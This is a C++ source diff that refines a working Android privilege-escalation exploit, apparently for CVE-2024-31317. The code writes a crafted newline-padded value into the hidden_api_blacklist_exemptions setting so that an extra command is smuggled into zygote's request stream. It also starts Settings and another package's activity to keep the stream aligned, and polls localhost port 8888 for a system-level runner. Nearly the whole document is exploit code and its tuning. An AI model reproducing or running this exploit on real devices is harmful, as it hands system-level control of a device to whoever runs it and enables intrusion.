@@ -16,8 +16,12 @@ namespace {
 
 constexpr const char *HIDDEN_SETTING = "hidden_api_blacklist_exemptions";
 constexpr int ZYGOTE_PORT = 8888;
-constexpr int NEWLINE_COUNT = 3000;
-constexpr int DELAY_PAIRS = 1400;
+constexpr size_t ZYGOTE_WRITER_SIZE = 8192;
+constexpr size_t PAYLOAD_ENTRY_COUNT = 3000;
+constexpr const char *PRIMARY_TRIGGER_PACKAGE = "com.android.settings";
+constexpr const char *PRIMARY_TRIGGER_ACTIVITY = "com.android.settings/.Settings";
+constexpr const char *SECONDARY_TRIGGER_PACKAGE = "com.tal.init.ota";
+constexpr const char *SECONDARY_TRIGGER_ACTIVITY = "com.tal.init.ota/.MainActivity";
 
 int write_all(int fd, const void *data, size_t length) {
     const auto *current = static_cast<const unsigned char *>(data);
@@ -46,9 +50,9 @@ int connect_localhost(int port) {
     return fd;
 }
 
-int run_command(char *const argv[], bool quiet = false) {
+pid_t spawn_command(char *const argv[], bool quiet = false) {
     pid_t pid = fork();
-    if (pid < 0) return 127;
+    if (pid < 0) return -1;
     if (pid == 0) {
         if (quiet) {
             int dev_null = open("/dev/null", O_RDWR | O_CLOEXEC);
@@ -61,7 +65,11 @@ int run_command(char *const argv[], bool quiet = false) {
         execv(argv[0], argv);
         _exit(127);
     }
+    return pid;
+}
 
+int wait_command(pid_t pid) {
+    if (pid < 0) return 127;
     int status = 0;
     while (waitpid(pid, &status, 0) < 0) {
         if (errno != EINTR) return 127;
@@ -69,6 +77,10 @@ int run_command(char *const argv[], bool quiet = false) {
     if (WIFEXITED(status)) return WEXITSTATUS(status);
     if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
     return 127;
+}
+
+int run_command(char *const argv[], bool quiet = false) {
+    return wait_command(spawn_command(argv, quiet));
 }
 
 int settings_delete() {
@@ -98,22 +110,31 @@ std::string build_zygote_payload() {
             "android.app.ActivityThread",
     };
 
-    std::string zygote_command = std::to_string(sizeof(arguments) / sizeof(arguments[0]));
+    constexpr size_t argument_count = sizeof(arguments) / sizeof(arguments[0]);
+
+    // Keep the injected command one line short. Its final argument is supplied by the argument
+    // count line of the next legitimate process start. system_server then consumes our process'
+    // PID as that start's result, so the request/response stream remains aligned.
+    std::string zygote_command = std::to_string(argument_count + PAYLOAD_ENTRY_COUNT);
     zygote_command.push_back('\n');
-    for (size_t i = 0; i < sizeof(arguments) / sizeof(arguments[0]); ++i) {
+    for (size_t i = 0; i < argument_count; ++i) {
         zygote_command.append(arguments[i]);
-        if (i + 1 != sizeof(arguments) / sizeof(arguments[0])) zygote_command.push_back('\n');
+        if (i + 1 != argument_count) zygote_command.push_back('\n');
     }
 
-    int header_length = snprintf(nullptr, 0, "--set-api-denylist-exemptions %d\n", NEWLINE_COUNT);
-    size_t newlines = NEWLINE_COUNT + 5;
-    size_t padding = 8192 - static_cast<size_t>(header_length) - newlines;
+    // system_server serializes one special argument plus PAYLOAD_ENTRY_COUNT setting entries.
+    // Put the injected command exactly at its BufferedWriter's second 8192-byte block.
+    std::string prefix = std::to_string(PAYLOAD_ENTRY_COUNT + 1);
+    prefix.append("\n--set-api-denylist-exemptions\n");
+    if (prefix.size() + PAYLOAD_ENTRY_COUNT >= ZYGOTE_WRITER_SIZE) return {};
+    size_t padding = ZYGOTE_WRITER_SIZE - prefix.size() - PAYLOAD_ENTRY_COUNT;
 
-    std::string payload(newlines, '\n');
+    std::string payload(PAYLOAD_ENTRY_COUNT, '\n');
     payload.append(padding, 'A');
     payload.append(zygote_command);
-    payload.push_back(',');
-    for (int i = 0; i < DELAY_PAIRS; ++i) payload.append(",\n");
+    for (size_t i = 1; i < PAYLOAD_ENTRY_COUNT; ++i) payload.push_back(',');
+    // Java String.split drops trailing empty entries, so keep the final one non-empty.
+    payload.push_back('X');
     return payload;
 }
 
@@ -129,25 +150,42 @@ int settings_put(const std::string &payload) {
     return run_command(argv, true);
 }
 
-void force_stop_settings() {
+void force_stop_package(const char *package_name) {
     char *const argv[] = {
             const_cast<char *>("/system/bin/am"),
             const_cast<char *>("force-stop"),
-            const_cast<char *>("com.android.settings"),
+            const_cast<char *>(package_name),
             nullptr,
     };
     run_command(argv, true);
 }
 
-void start_settings() {
-    char *const argv[] = {
+void start_alignment_triggers() {
+    char *const primary_argv[] = {
             const_cast<char *>("/system/bin/am"),
             const_cast<char *>("start"),
             const_cast<char *>("-n"),
-            const_cast<char *>("com.android.settings/.Settings"),
+            const_cast<char *>(PRIMARY_TRIGGER_ACTIVITY),
             nullptr,
     };
-    run_command(argv, true);
+    char *const secondary_argv[] = {
+            const_cast<char *>("/system/bin/am"),
+            const_cast<char *>("start"),
+            const_cast<char *>("-n"),
+            const_cast<char *>(SECONDARY_TRIGGER_ACTIVITY),
+            nullptr,
+    };
+
+    // Both zygotes have a roughly one-second read timeout while waiting for the deliberately
+    // missing line. Queue both starts concurrently and without -W so neither ABI waits for the
+    // other's activity lifecycle.
+    pid_t primary = spawn_command(primary_argv, true);
+    pid_t secondary = spawn_command(secondary_argv, true);
+    int primary_status = wait_command(primary);
+    int secondary_status = wait_command(secondary);
+    printf("info: zygote alignment primary=%d secondary=%d\n",
+            primary_status, secondary_status);
+    fflush(stdout);
 }
 
 int acquire_system_runner() {
@@ -158,28 +196,36 @@ int acquire_system_runner() {
     }
 
     const std::string payload = build_zygote_payload();
+    if (payload.empty()) return -1;
     for (int attempt = 1; attempt <= 3; ++attempt) {
         settings_delete();
-        force_stop_settings();
+        force_stop_package(PRIMARY_TRIGGER_PACKAGE);
+        force_stop_package(SECONDARY_TRIGGER_PACKAGE);
         if (settings_put(payload) != 0) {
             settings_delete();
+            force_stop_package(PRIMARY_TRIGGER_PACKAGE);
+            force_stop_package(SECONDARY_TRIGGER_PACKAGE);
             return -1;
         }
 
-        sleep(2);
+        start_alignment_triggers();
+
         for (int poll = 0; poll < 12; ++poll) {
             int fd = connect_localhost(ZYGOTE_PORT);
             if (fd >= 0) {
                 close(fd);
                 settings_delete();
+                force_stop_package(PRIMARY_TRIGGER_PACKAGE);
+                force_stop_package(SECONDARY_TRIGGER_PACKAGE);
                 return 0;
             }
-            if (poll == 0) start_settings();
             sleep(1);
         }
         fprintf(stderr, "warn: XPad 31317 attempt %d failed\n", attempt);
     }
     settings_delete();
+    force_stop_package(PRIMARY_TRIGGER_PACKAGE);
+    force_stop_package(SECONDARY_TRIGGER_PACKAGE);
     return -1;
 }
 
